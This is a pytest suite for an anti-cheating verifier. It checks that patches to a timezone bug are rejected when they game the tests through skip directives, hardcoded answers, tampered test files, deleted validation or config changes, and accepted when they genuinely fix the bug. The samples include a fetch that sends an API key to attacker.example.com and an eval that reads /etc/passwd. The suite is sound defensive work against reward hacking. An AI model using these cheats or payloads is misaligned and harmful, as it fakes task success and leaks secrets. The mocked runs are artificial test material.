"""
Adversarial Anti-Cheating Test Suite (Phase 19).
Proves the Private Hidden Verifier oracle systematically rejects cheating attempts.
"""

from pathlib import Path
from unittest.mock import MagicMock
import pytest

from scopelet.capsule.models import CapsuleManifest
from scopelet.patches import BoundaryChecker
from scopelet.runner import ExecutionResult, IsolatedRunner
from scopelet.verifier import PrivateHiddenVerifier, Verdict


def _setup_timezone_mock_repo(tmp_path: Path) -> Path:
    repo = tmp_path / "private_timezone_repo"
    repo.mkdir()
    (repo / "src").mkdir()
    (repo / "src" / "date").mkdir()
    (repo / "tests").mkdir()
    (repo / "tests" / "hidden").mkdir()

    (repo / "src" / "date" / "timezone.ts").write_text(
        "export function getInvoiceDate(timestamp: Date, tz: string): string {\n"
        "    return timestamp.toISOString().split('T')[0]; // Buggy: UTC instead of tz\n"
        "}\n"
        "export function validateTimestamp(timestamp: Date): boolean {\n"
        "    if (isNaN(timestamp.getTime())) throw new Error('Invalid timestamp');\n"
        "    return true;\n"
        "}\n",
        encoding="utf-8",
    )

    (repo / "tests" / "invoice-timezone.test.ts").write_text(
        "// Target visible bug reproduction test\n",
        encoding="utf-8",
    )
    (repo / "tests" / "hidden" / "invoice.hidden.test.ts").write_text(
        "// Private hidden regression assertions\n",
        encoding="utf-8",
    )
    return repo


def test_cheat_test_skip_directive_rejected(tmp_path: Path):
    """
    Cheat 1: Adversarial solver adds test.skip(...) or describe.skip(...) to bypass failing tests.
    Detection mechanism: TestTamperingPolicy & TestSkippingCheck.
    Expected verdict: REJECT.
    """
    repo = _setup_timezone_mock_repo(tmp_path)
    mock_runner = MagicMock()

    patch_skip = (
        "--- a/src/date/timezone.ts\n"
        "+++ b/src/date/timezone.ts\n"
        "@@ -1,3 +1,4 @@\n"
        "+test.skip('bypassing assertion check');\n"
        " export function getInvoiceDate(timestamp: Date, tz: string): string {\n"
        "     return timestamp.toISOString().split('T')[0];\n"
        " }\n"
    )

    verifier = PrivateHiddenVerifier(repo_dir=repo, runner=mock_runner)
    report = verifier.verify(patch_skip)

    assert report.verdict == Verdict.REJECT
    assert any("Test Tampering Policy" in r for r in report.rejection_reasons)
    mock_runner.run.assert_not_called()


def test_cheat_hardcoded_return_caught_by_hidden_regression(tmp_path: Path):
    """
    Cheat 2: Solver hardcodes the exact visible test answer (return "2026-10-18").
    Detection mechanism: Hidden regression tests execute multiple different timestamps.
    Expected verdict: REJECT.
    """
    repo = _setup_timezone_mock_repo(tmp_path)
    mock_runner = MagicMock()

    def mock_run_command(cmd, cwd, timeout):
        # Target test passes with hardcoded answer
        if "invoice-timezone.test" in cmd:
            return ExecutionResult(
                command=cmd,
                exit_code=0,
                stdout="PASSED: Expected 2026-10-18 received 2026-10-18",
                stderr="",
                duration_ms=40,
                backend="local_sandbox",
                tree_hash="hash123",
                timed_out=False,
            )
        # Hidden regression suite uses alternative dates and catches hardcoded response
        elif "hidden" in cmd:
            return ExecutionResult(
                command=cmd,
                exit_code=1,
                stdout="FAILED: Tokyo timestamp expected 2027-01-01 but received 2026-10-18",
                stderr="",
                duration_ms=50,
                backend="local_sandbox",
                tree_hash="hash123",
                timed_out=False,
            )
        return ExecutionResult(
            command=cmd,
            exit_code=0,
            stdout="OK",
            stderr="",
            duration_ms=20,
            backend="local_sandbox",
            tree_hash="hash123",
            timed_out=False,
        )

    mock_runner.run.side_effect = mock_run_command

    patch_hardcoded = (
        "--- a/src/date/timezone.ts\n"
        "+++ b/src/date/timezone.ts\n"
        "@@ -1,3 +1,3 @@\n"
        " export function getInvoiceDate(timestamp: Date, tz: string): string {\n"
        "-    return timestamp.toISOString().split('T')[0];\n"
        "+    return '2026-10-18';\n"
        " }\n"
    )

    verifier = PrivateHiddenVerifier(
        repo_dir=repo,
        runner=mock_runner,
        hidden_regression_cmd="npm test -- tests/hidden/invoice.hidden.test.ts",
    )
    report = verifier.verify(
        patch_hardcoded,
        target_cmd="npm test -- tests/invoice-timezone.test.ts",
    )

    assert report.verdict == Verdict.REJECT
    assert report.target_test is not None
    assert report.target_test.passed is True
    assert report.hidden_regression_test is not None
    assert report.hidden_regression_test.passed is False
    assert any("Hidden regression test suite failed" in r for r in report.rejection_reasons)


def test_cheat_delete_validation_caught_by_regression(tmp_path: Path):
    """
    Cheat 3: Solver deletes input validation logic to circumvent edge cases.
    Detection mechanism: Hidden regression assertions expect validation exceptions.
    Expected verdict: REJECT.
    """
    repo = _setup_timezone_mock_repo(tmp_path)
    mock_runner = MagicMock()

    def mock_run_command(cmd, cwd, timeout):
        if "hidden" in cmd:
            return ExecutionResult(
                command=cmd,
                exit_code=1,
                stdout="FAILED: Expected Invalid timestamp error to be thrown but function returned true",
                stderr="",
                duration_ms=35,
                backend="local_sandbox",
                tree_hash="hash123",
                timed_out=False,
            )
        return ExecutionResult(
            command=cmd,
            exit_code=0,
            stdout="OK",
            stderr="",
            duration_ms=25,
            backend="local_sandbox",
            tree_hash="hash123",
            timed_out=False,
        )

    mock_runner.run.side_effect = mock_run_command

    patch_delete_val = (
        "--- a/src/date/timezone.ts\n"
        "+++ b/src/date/timezone.ts\n"
        "@@ -4,4 +4,2 @@\n"
        " export function validateTimestamp(timestamp: Date): boolean {\n"
        "-    if (isNaN(timestamp.getTime())) throw new Error('Invalid timestamp');\n"
        "     return true;\n"
        " }\n"
    )

    verifier = PrivateHiddenVerifier(
        repo_dir=repo,
        runner=mock_runner,
        hidden_regression_cmd="npm test -- tests/hidden/invoice.hidden.test.ts",
    )
    report = verifier.verify(patch_delete_val, target_cmd="npm test")

    assert report.verdict == Verdict.REJECT
    assert report.hidden_regression_test.passed is False
    assert any("Hidden regression test suite failed" in r for r in report.rejection_reasons)


def test_cheat_modify_package_json_rejected(tmp_path: Path):
    """
    Cheat 4: Solver tries to alter package.json or install arbitrary libraries.
    Detection mechanism: ConfigurationIntegrityPolicy and BoundaryChecker.
    Expected verdict: REJECT.
    """
    repo = _setup_timezone_mock_repo(tmp_path)
    mock_runner = MagicMock()

    patch_pkg = (
        "--- a/package.json\n"
        "+++ b/package.json\n"
        "@@ -1,3 +1,4 @@\n"
        " {\n"
        "+  \"dependencies\": { \"cheat-lib\": \"1.0.0\" },\n"
        "   \"name\": \"timezone-service\"\n"
        " }\n"
    )

    verifier = PrivateHiddenVerifier(repo_dir=repo, runner=mock_runner)
    report = verifier.verify(patch_pkg)

    assert report.verdict == Verdict.REJECT
    assert any("Configuration Integrity Policy" in r for r in report.rejection_reasons)
    mock_runner.run.assert_not_called()


def test_cheat_network_call_exfiltration_rejected(tmp_path: Path):
    """
    Cheat 5: Solver tries to exfiltrate private tokens or call out to an external server.
    Detection mechanism: NetworkSecurityPolicy and network sandboxing.
    Expected verdict: REJECT.
    """
    repo = _setup_timezone_mock_repo(tmp_path)
    mock_runner = MagicMock()

    patch_net = (
        "--- a/src/date/timezone.ts\n"
        "+++ b/src/date/timezone.ts\n"
        "@@ -1,3 +1,4 @@\n"
        " export function getInvoiceDate(timestamp: Date, tz: string): string {\n"
        "+    fetch('https://attacker.example.com/exfiltrate?env=' + process.env.API_KEY);\n"
        "     return timestamp.toISOString().split('T')[0];\n"
        " }\n"
    )

    verifier = PrivateHiddenVerifier(repo_dir=repo, runner=mock_runner)
    report = verifier.verify(patch_net)

    assert report.verdict == Verdict.REJECT
    assert any("Network Security Policy" in r for r in report.rejection_reasons)
    mock_runner.run.assert_not_called()


def test_cheat_modify_test_file_rejected(tmp_path: Path):
    """
    Cheat 6: Solver modifies the test file to make it trivially pass.
    Detection mechanism: TestTamperingPolicy and BoundaryChecker.
    Expected verdict: REJECT.
    """
    repo = _setup_timezone_mock_repo(tmp_path)
    mock_runner = MagicMock()

    patch_test = (
        "--- a/tests/invoice-timezone.test.ts\n"
        "+++ b/tests/invoice-timezone.test.ts\n"
        "@@ -1,2 +1,2 @@\n"
        "-expect(actual).toBe(expected);\n"
        "+expect(true).toBe(true);\n"
    )

    verifier = PrivateHiddenVerifier(repo_dir=repo, runner=mock_runner)
    report = verifier.verify(patch_test)

    assert report.verdict == Verdict.REJECT
    assert any("Test Tampering Policy" in r for r in report.rejection_reasons)
    mock_runner.run.assert_not_called()


def test_cheat_bump_dependency_version_rejected(tmp_path: Path):
    """
    Cheat 7: Solver modifies dependency requirements or bumps versions.
    Detection mechanism: ConfigurationIntegrityPolicy and DependencyVersionCheck.
    Expected verdict: REJECT.
    """
    repo = _setup_timezone_mock_repo(tmp_path)
    mock_runner = MagicMock()

    patch_dep = (
        "--- a/requirements.txt\n"
        "+++ b/requirements.txt\n"
        "@@ -1 +1 @@\n"
        "-dateutil==2.8.1\n"
        "+dateutil==2.8.2\n"
    )

    verifier = PrivateHiddenVerifier(repo_dir=repo, runner=mock_runner)
    report = verifier.verify(patch_dep)

    assert report.verdict == Verdict.REJECT
    assert any("Configuration Integrity Policy" in r for r in report.rejection_reasons)
    mock_runner.run.assert_not_called()


def test_cheat_arbitrary_shell_execution_rejected(tmp_path: Path):
    """
    Cheat 8: Solver injects eval, child_process or subprocess execution.
    Detection mechanism: CodeExecutionPolicy and BoundaryChecker.
    Expected verdict: REJECT.
    """
    repo = _setup_timezone_mock_repo(tmp_path)
    mock_runner = MagicMock()

    patch_exec = (
        "--- a/src/date/timezone.ts\n"
        "+++ b/src/date/timezone.ts\n"
        "@@ -1,3 +1,4 @@\n"
        " export function getInvoiceDate(timestamp: Date, tz: string): string {\n"
        "+    eval('require(\"child_process\").execSync(\"cat /etc/passwd\")');\n"
        "     return timestamp.toISOString().split('T')[0];\n"
        " }\n"
    )

    verifier = PrivateHiddenVerifier(repo_dir=repo, runner=mock_runner)
    report = verifier.verify(patch_exec)

    assert report.verdict == Verdict.REJECT
    assert any("Arbitrary Code Execution Policy" in r for r in report.rejection_reasons)
    mock_runner.run.assert_not_called()


def test_cheat_modify_forbidden_files_rejected(tmp_path: Path):
    """
    Cheat 9: Solver attempts to modify files outside task allowed_changes.
    Detection mechanism: AllowedFilesPolicy and BoundaryChecker.
    Expected verdict: REJECT.
    """
    repo = _setup_timezone_mock_repo(tmp_path)
    mock_runner = MagicMock()

    patch_forbidden = (
        "--- a/src/auth/jwt.service.ts\n"
        "+++ b/src/auth/jwt.service.ts\n"
        "@@ -1 +1 @@\n"
        "-const key = 'secret';\n"
        "+const key = 'insecure';\n"
    )

    manifest = CapsuleManifest(
        schema_version="1.0",
        capsule_hash="capsule123",
        title="Timezone bug",
        command="npm test",
        created_at="2026-10-18T00:00:00Z",
        allowed_changes=["src/date/timezone.ts"],
    )

    verifier = PrivateHiddenVerifier(repo_dir=repo, runner=mock_runner)
    report = verifier.verify(patch_forbidden, manifest=manifest)

    assert report.verdict == Verdict.REJECT
    assert any("Allowed Files Policy" in r for r in report.rejection_reasons)
    mock_runner.run.assert_not_called()


def test_genuine_bugfix_accepted(tmp_path: Path):
    """
    Legitimate Fix: Solver correctly fixes timezone logic without cheating.
    Passes boundary policy, original test, hidden regression suite, type check and build.
    Expected verdict: ACCEPT.
    """
    repo = _setup_timezone_mock_repo(tmp_path)
    mock_runner = MagicMock()

    mock_runner.run.return_value = ExecutionResult(
        command="npm test",
        exit_code=0,
        stdout="All 8 tests passed",
        stderr="",
        duration_ms=45,
        backend="local_sandbox",
        tree_hash="hash123",
        timed_out=False,
    )

    clean_fix = (
        "--- a/src/date/timezone.ts\n"
        "+++ b/src/date/timezone.ts\n"
        "@@ -1,3 +1,3 @@\n"
        " export function getInvoiceDate(timestamp: Date, tz: string): string {\n"
        "-    return timestamp.toISOString().split('T')[0]; // Buggy: UTC instead of tz\n"
        "+    return new Intl.DateTimeFormat('en-CA', { timeZone: tz }).format(timestamp);\n"
        " }\n"
    )

    manifest = CapsuleManifest(
        schema_version="1.0",
        capsule_hash="capsule123",
        title="Timezone bug",
        command="npm test",
        created_at="2026-10-18T00:00:00Z",
        allowed_changes=["src/date/timezone.ts"],
    )

    verifier = PrivateHiddenVerifier(
        repo_dir=repo,
        runner=mock_runner,
        hidden_regression_cmd="npm test -- tests/hidden/invoice.hidden.test.ts",
        type_check_cmd="npx tsc --noEmit",
        build_cmd="npm run build",
    )

    report = verifier.verify(clean_fix, manifest=manifest)

    assert report.verdict == Verdict.ACCEPT
    assert report.target_test.passed is True
    assert report.hidden_regression_test.passed is True
    assert report.type_check.passed is True
    assert report.build_check.passed is True
    assert len(report.rejection_reasons) == 0
